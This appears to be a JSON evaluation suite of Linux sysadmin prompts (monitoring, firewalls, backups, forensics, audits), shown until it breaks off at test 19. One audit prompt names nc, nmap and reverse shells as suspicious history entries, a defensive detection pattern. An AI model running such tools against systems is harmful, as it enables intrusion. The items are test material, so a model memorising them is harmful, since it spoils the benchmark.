{
  "suite_info": {
    "name": "Instruct Linux Complex Tests",
    "version": "1.0.0",
    "total_tests": 100,
    "extracted_from": "test_linux_complicated.py",
    "extraction_date": "2024-01-01",
    "api_type": "chat"
  },
  "tests": [
    {
      "id": "linux_test_01",
      "name": "Test 1: Proactive Resource Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nWrite a Python script that:\n1. Uses `psutil` to find processes consuming >1GB RAM or >50% CPU for more than 60 seconds.\n2. For each such process, gracefully sends a SIGTERM signal.\n3. If the process does not terminate within 10 seconds, forcefully sends a SIGKILL signal.\n4. Logs every action (detection, SIGTERM, SIGKILL) with PID, process name, and resource usage metrics to a JSON log file at `/var/log/resource_monitor.json`.\n5. The script should run as a continuous daemon.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script that:\n1. Uses `psutil` to find processes consuming >1GB RAM or >50% CPU for more than 60 seconds.\n2. For each such process, gracefully sends a SIGTERM signal.\n3. If the process does not terminate within 10 seconds, forcefully sends a SIGKILL signal.\n4. Logs every action (detection, SIGTERM, SIGKILL) with PID, process name, and resource usage metrics to a JSON log file at `/var/log/resource_monitor.json`.\n5. The script should run as a continuous daemon.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_02",
      "name": "Test 2: High-Availability Container Stack",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nCreate a docker-compose.yml for a high-availability web service:\n- Use Traefik as a reverse proxy that load balances two instances of a Python backend app.\n- Traefik must handle automatic SSL certificate generation via Let's Encrypt for `app.example.com`.\n- Include a PostgreSQL database with a persistent named volume for data.\n- Include a Redis cache for session storage.\n- Define strict resource limits (CPU/memory) and healthchecks for all services.\n- Use Docker secrets to manage the database password.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a docker-compose.yml for a high-availability web service:\n- Use Traefik as a reverse proxy that load balances two instances of a Python backend app.\n- Traefik must handle automatic SSL certificate generation via Let's Encrypt for `app.example.com`.\n- Include a PostgreSQL database with a persistent named volume for data.\n- Include a Redis cache for session storage.\n- Define strict resource limits (CPU/memory) and healthchecks for all services.\n- Use Docker secrets to manage the database password.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_03",
      "name": "Test 3: Advanced Firewall with IPSet",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nWrite a bash script to configure iptables using ipset for dynamic blocking:\n1. Create an ipset hash named `dynamic_blacklist`.\n2. Add an iptables rule to the INPUT chain to drop all traffic from IPs in the `dynamic_blacklist` set.\n3. Create a second rule that logs and then adds the source IP to `dynamic_blacklist` if it attempts to connect to port 23 (telnet).\n4. Add rules to allow SSH from a trusted network (10.0.0.0/8) and established connections.\n5. Ensure the rules and the ipset persist across reboots.\nInclude comments for each step.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a bash script to configure iptables using ipset for dynamic blocking:\n1. Create an ipset hash named `dynamic_blacklist`.\n2. Add an iptables rule to the INPUT chain to drop all traffic from IPs in the `dynamic_blacklist` set.\n3. Create a second rule that logs and then adds the source IP to `dynamic_blacklist` if it attempts to connect to port 23 (telnet).\n4. Add rules to allow SSH from a trusted network (10.0.0.0/8) and established connections.\n5. Ensure the rules and the ipset persist across reboots.\nInclude comments for each step.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_04",
      "name": "Test 4: Correlated Health Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nCreate a bash script that checks system health by correlating metrics:\n- If CPU usage is >80% for 3 consecutive checks (10s apart), get the top 3 CPU-consuming PIDs and their command lines.\n- If available memory is <500MB, check for kernel OOM killer messages in dmesg from the last hour.\n- If disk usage on `/` is >85%, list the 10 largest directories within `/var/log`.\n- If the 1-minute load average exceeds the number of CPU cores, log a critical warning with the current load and core count.\nOutput should be in a structured log format: \"TIMESTAMP LEVEL [CHECK_NAME] Details...\"\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a bash script that checks system health by correlating metrics:\n- If CPU usage is >80% for 3 consecutive checks (10s apart), get the top 3 CPU-consuming PIDs and their command lines.\n- If available memory is <500MB, check for kernel OOM killer messages in dmesg from the last hour.\n- If disk usage on `/` is >85%, list the 10 largest directories within `/var/log`.\n- If the 1-minute load average exceeds the number of CPU cores, log a critical warning with the current load and core count.\nOutput should be in a structured log format: \"TIMESTAMP LEVEL [CHECK_NAME] Details...\"\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_05",
      "name": "Test 5: Forensic Security Snapshot",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nWrite a script that creates a forensic snapshot of the current system state:\n1. Find all SUID/SGID binaries modified in the last 7 days.\n2. List all active listening ports and the PIDs/names of the services using them.\n3. Dump the command history for all currently logged-in users.\n4. Hash the contents of `/etc/passwd` and `/etc/shadow` and store the hashes.\n5. Package all findings into a single compressed tarball named `snapshot-HOSTNAME-YYYYMMDD.tar.gz`.\nReport findings to stdout and write the detailed files into the tarball.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script that creates a forensic snapshot of the current system state:\n1. Find all SUID/SGID binaries modified in the last 7 days.\n2. List all active listening ports and the PIDs/names of the services using them.\n3. Dump the command history for all currently logged-in users.\n4. Hash the contents of `/etc/passwd` and `/etc/shadow` and store the hashes.\n5. Package all findings into a single compressed tarball named `snapshot-HOSTNAME-YYYYMMDD.tar.gz`.\nReport findings to stdout and write the detailed files into the tarball.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_06",
      "name": "Test 6: Idempotent Database Backup & Restore",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nCreate a robust PostgreSQL management script that can be run with `backup` or `restore` arguments:\n- `backup`: Dumps the 'production' database, encrypts the dump using GPG with a public key (`backup_key.pub`), and uploads it to an S3 bucket. The filename should be `backup-YYYYMMDD-HHMMSS.sql.gz.gpg`.\n- `restore`: Lists available backups from the S3 bucket, prompts the user to choose one, downloads it, decrypts it with a GPG private key, and restores it to a new database named `production_restored_TIMESTAMP`.\n- Both operations must be logged extensively.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a robust PostgreSQL management script that can be run with `backup` or `restore` arguments:\n- `backup`: Dumps the 'production' database, encrypts the dump using GPG with a public key (`backup_key.pub`), and uploads it to an S3 bucket. The filename should be `backup-YYYYMMDD-HHMMSS.sql.gz.gpg`.\n- `restore`: Lists available backups from the S3 bucket, prompts the user to choose one, downloads it, decrypts it with a GPG private key, and restores it to a new database named `production_restored_TIMESTAMP`.\n- Both operations must be logged extensively.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_07",
      "name": "Test 7: Stateful Service Manager",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a Python script using `systemd-python` that manages a set of services (`nginx`, `mysql`, `redis`):\n1. Checks the state of each service.\n2. If a service is 'failed', it should first try to restart it.\n3. If it enters the 'failed' state again within 5 minutes, the script should not restart it again and instead send an alert (print to stderr).\n4. If a service depends on another (e.g., app depends on mysql), it should ensure the dependency is active before starting the service.\n5. Log all state changes and actions in a structured format.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script using `systemd-python` that manages a set of services (`nginx`, `mysql`, `redis`):\n1. Checks the state of each service.\n2. If a service is 'failed', it should first try to restart it.\n3. If it enters the 'failed' state again within 5 minutes, the script should not restart it again and instead send an alert (print to stderr).\n4. If a service depends on another (e.g., app depends on mysql), it should ensure the dependency is active before starting the service.\n5. Log all state changes and actions in a structured format.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_08",
      "name": "Test 8: Advanced Network Path Diagnostics",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nCreate a network diagnostic script that:\n1. Takes a domain name as an argument (e.g., 'google.com').\n2. Performs a DNS lookup for A, AAAA, and MX records.\n3. Uses `mtr` or `traceroute` to map the network path to the resolved A record IP.\n4. For each hop in the path, it attempts to measure latency.\n5. Checks if key ports (80, 443) are open on the final destination.\n6. Formats the final output as a JSON object containing DNS results, the full path trace with latencies, and port status.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a network diagnostic script that:\n1. Takes a domain name as an argument (e.g., 'google.com').\n2. Performs a DNS lookup for A, AAAA, and MX records.\n3. Uses `mtr` or `traceroute` to map the network path to the resolved A record IP.\n4. For each hop in the path, it attempts to measure latency.\n5. Checks if key ports (80, 443) are open on the final destination.\n6. Formats the final output as a JSON object containing DNS results, the full path trace with latencies, and port status.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_09",
      "name": "Test 9: Dynamic Log Rotation and Archiving",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a logrotate configuration for `/var/log/myapp/*.log` that:\n- Rotates when the file size exceeds 50MB or daily, whichever comes first.\n- Keeps 7 rotated logs locally, compressed.\n- Has a `postrotate` script that reloads the app.\n- Includes a `lastaction` script that runs after the rotation is complete to securely archive logs older than 7 days to a remote server using `rsync` over SSH.\n- The user/group for new logs should be `myapp:myapp`.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a logrotate configuration for `/var/log/myapp/*.log` that:\n- Rotates when the file size exceeds 50MB or daily, whichever comes first.\n- Keeps 7 rotated logs locally, compressed.\n- Has a `postrotate` script that reloads the app.\n- Includes a `lastaction` script that runs after the rotation is complete to securely archive logs older than 7 days to a remote server using `rsync` over SSH.\n- The user/group for new logs should be `myapp:myapp`.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_10",
      "name": "Test 10: Systemd Service Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nInstead of a bash script, write a systemd service unit file (`myapp-monitor.service`) and a corresponding timer unit (`myapp-monitor.timer`) to monitor a process:\n1. The timer should trigger the service every 60 seconds.\n2. The service unit should execute a script that checks if the 'myapp' process is running.\n3. If not running, it should start `/usr/bin/myapp`.\n4. Configure the main `myapp.service` to automatically restart on failure, but with a rate limit (`StartLimitBurst`) to prevent a restart loop. The monitor's job is to be a secondary check.\n5. Explain how to enable and start the timer.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nInstead of a bash script, write a systemd service unit file (`myapp-monitor.service`) and a corresponding timer unit (`myapp-monitor.timer`) to monitor a process:\n1. The timer should trigger the service every 60 seconds.\n2. The service unit should execute a script that checks if the 'myapp' process is running.\n3. If not running, it should start `/usr/bin/myapp`.\n4. Configure the main `myapp.service` to automatically restart on failure, but with a rate limit (`StartLimitBurst`) to prevent a restart loop. The monitor's job is to be a secondary check.\n5. Explain how to enable and start the timer.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_11",
      "name": "Test 11: Cryptographic Backup Verification",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nCreate a script that verifies the integrity of the latest backup in `/backup/`:\n1. The backup directory contains data archives (`.tar.gz`) and a corresponding SHA256 checksum file (`.sha256`).\n2. The script must find the latest archive and its checksum file.\n3. It must recalculate the SHA256 hash of the archive and verify it against the contents of the checksum file.\n4. If the hash matches, it should then extract the archive to a temporary location.\n5. It then checks if a critical file, `/__CONFIG_VARS__`, exists within the extracted archive.\n6. Reports success or failure and cleans up the temporary files.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a script that verifies the integrity of the latest backup in `/backup/`:\n1. The backup directory contains data archives (`.tar.gz`) and a corresponding SHA256 checksum file (`.sha256`).\n2. The script must find the latest archive and its checksum file.\n3. It must recalculate the SHA256 hash of the archive and verify it against the contents of the checksum file.\n4. If the hash matches, it should then extract the archive to a temporary location.\n5. It then checks if a critical file, `/__CONFIG_VARS__`, exists within the extracted archive.\n6. Reports success or failure and cleans up the temporary files.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_12",
      "name": "Test 12: Proactive SSL Certificate Management",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a script that automates SSL certificate lifecycle management:\n1. Scan a directory of nginx configuration files (`/etc/nginx/sites-enabled/`) to find all unique `server_name` directives.\n2. For each domain found, check its live SSL certificate's expiration date.\n3. If a certificate is expiring in less than 15 days, trigger a renewal using `certbot renew`.\n4. After attempting renewals, verify that the renewal was successful by checking the new expiration date.\n5. If and only if a certificate was successfully renewed, gracefully reload the nginx service.\n6. Log all actions and send a summary email to an administrator.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script that automates SSL certificate lifecycle management:\n1. Scan a directory of nginx configuration files (`/etc/nginx/sites-enabled/`) to find all unique `server_name` directives.\n2. For each domain found, check its live SSL certificate's expiration date.\n3. If a certificate is expiring in less than 15 days, trigger a renewal using `certbot renew`.\n4. After attempting renewals, verify that the renewal was successful by checking the new expiration date.\n5. If and only if a certificate was successfully renewed, gracefully reload the nginx service.\n6. Log all actions and send a summary email to an administrator.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_13",
      "name": "Test 13: Intelligent Docker Cleanup Tool",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nCreate a Docker maintenance script with advanced logic:\n1. Remove all stopped containers.\n2. Remove dangling images and build cache.\n3. Remove unused volumes, but first, check if the volume name matches a pattern (`pgdata-*` or `esdata-*`) and if so, prompt for confirmation before deletion.\n4. Identify images that have not been used to run a container in the last 30 days and list them as candidates for removal.\n5. Provide a `--force` flag to bypass all confirmation prompts.\n6. Display a summary of reclaimed space, broken down by category (containers, images, volumes).\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a Docker maintenance script with advanced logic:\n1. Remove all stopped containers.\n2. Remove dangling images and build cache.\n3. Remove unused volumes, but first, check if the volume name matches a pattern (`pgdata-*` or `esdata-*`) and if so, prompt for confirmation before deletion.\n4. Identify images that have not been used to run a container in the last 30 days and list them as candidates for removal.\n5. Provide a `--force` flag to bypass all confirmation prompts.\n6. Display a summary of reclaimed space, broken down by category (containers, images, volumes).\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_14",
      "name": "Test 14: eBPF-based Performance Baseline",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a Python script using the `bcc` framework (eBPF) to capture a low-level performance baseline:\n1. Trace new process creation (`exec()` syscalls) for 60 seconds.\n2. Trace block I/O requests to show which processes are writing to disk.\n3. Capture TCP connection initiations (connects).\n4. Aggregate the captured data to show:\n   - Top 5 most frequently executed commands.\n   - Top 5 processes by I/O write volume.\n   - Top 5 most frequently contacted destination IPs.\n5. Output the final summary as a YAML file.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script using the `bcc` framework (eBPF) to capture a low-level performance baseline:\n1. Trace new process creation (`exec()` syscalls) for 60 seconds.\n2. Trace block I/O requests to show which processes are writing to disk.\n3. Capture TCP connection initiations (connects).\n4. Aggregate the captured data to show:\n   - Top 5 most frequently executed commands.\n   - Top 5 processes by I/O write volume.\n   - Top 5 most frequently contacted destination IPs.\n5. Output the final summary as a YAML file.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_15",
      "name": "Test 15: User Audit with Anomaly Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a user audit script that performs security checks and basic anomaly detection:\n1. Identify all non-system user accounts.\n2. For each user, check for passwordless sudo privileges in `/etc/sudoers.d/`.\n3. Check the user's `.bash_history` for suspicious commands (e.g., `nc`, `nmap`, reverse shells).\n4. ANOMALY: Flag any user account whose UID is < 1000 but is not a standard system account (like root, daemon, bin).\n5. ANOMALY: Flag any user who owns files in `/tmp` that are SUID.\n6. Format the output as a report with [PASS], [FAIL], and [ANOMALY] markers.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a user audit script that performs security checks and basic anomaly detection:\n1. Identify all non-system user accounts.\n2. For each user, check for passwordless sudo privileges in `/etc/sudoers.d/`.\n3. Check the user's `.bash_history` for suspicious commands (e.g., `nc`, `nmap`, reverse shells).\n4. ANOMALY: Flag any user account whose UID is < 1000 but is not a standard system account (like root, daemon, bin).\n5. ANOMALY: Flag any user who owns files in `/tmp` that are SUID.\n6. Format the output as a report with [PASS], [FAIL], and [ANOMALY] markers.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_16",
      "name": "Test 16: Multi-Endpoint API Health Checker",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a concurrent API health checker in Python using `asyncio` and `aiohttp`:\n1. Read a list of API endpoints and their expected success conditions from a YAML config file. (e.g., URL, expected status code, optional JSON key:value to check in response).\n2. Concurrently check all endpoints.\n3. Implement a retry mechanism with exponential backoff for failed checks (3 retries max).\n4. If an endpoint is definitively down after retries, log a critical alert.\n5. Expose the health status of all monitored endpoints via a simple local HTTP server on port 9100 (e.g., /metrics).\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a concurrent API health checker in Python using `asyncio` and `aiohttp`:\n1. Read a list of API endpoints and their expected success conditions from a YAML config file. (e.g., URL, expected status code, optional JSON key:value to check in response).\n2. Concurrently check all endpoints.\n3. Implement a retry mechanism with exponential backoff for failed checks (3 retries max).\n4. If an endpoint is definitively down after retries, log a critical alert.\n5. Expose the health status of all monitored endpoints via a simple local HTTP server on port 9100 (e.g., /metrics).\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_17",
      "name": "Test 17: Git Repository State Management",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a git management script that can `save` or `restore` the state of a repository:\n- `save`: Creates a named snapshot. It should record the current branch name, the latest commit hash, and the status of uncommitted changes (by creating a patch file). It stores this info in a local `.git/snapshots/` directory.\n- `restore`: Lists all saved snapshots. When a snapshot name is provided, it checks for uncommitted changes (and fails if any exist), then checks out the specified commit hash and applies the corresponding patch file to restore the working directory state.\n- Handle edge cases like being in a detached HEAD state.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a git management script that can `save` or `restore` the state of a repository:\n- `save`: Creates a named snapshot. It should record the current branch name, the latest commit hash, and the status of uncommitted changes (by creating a patch file). It stores this info in a local `.git/snapshots/` directory.\n- `restore`: Lists all saved snapshots. When a snapshot name is provided, it checks for uncommitted changes (and fails if any exist), then checks out the specified commit hash and applies the corresponding patch file to restore the working directory state.\n- Handle edge cases like being in a detached HEAD state.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_18",
      "name": "Test 18: OS-Agnostic Update and Health Check",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite an update script in Python that is OS-agnostic (works on Debian/Ubuntu and RHEL/CentOS/Fedora):\n1. Detect the system's package manager (`apt`, `yum`, `dnf`).\n2. Before updating, check for critical service health (e.g., is a database listener on port 5432 running?). If not, abort the update.\n3. Perform a dry-run of the update to list pending packages.\n4. Apply only security-related updates.\n5. After updating, re-run the critical service health check to ensure nothing broke.\n6. Log the entire process, including the list of updated packages, to a file.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite an update script in Python that is OS-agnostic (works on Debian/Ubuntu and RHEL/CentOS/Fedora):\n1. Detect the system's package manager (`apt`, `yum`, `dnf`).\n2. Before updating, check for critical service health (e.g., is a database listener on port 5432 running?). If not, abort the update.\n3. Perform a dry-run of the update to list pending packages.\n4. Apply only security-related updates.\n5. After updating, re-run the critical service health check to ensure nothing broke.\n6. Log the entire process, including the list of updated packages, to a file.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_19",
      "name": "Test 19: Process Sandboxing with Systemd",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
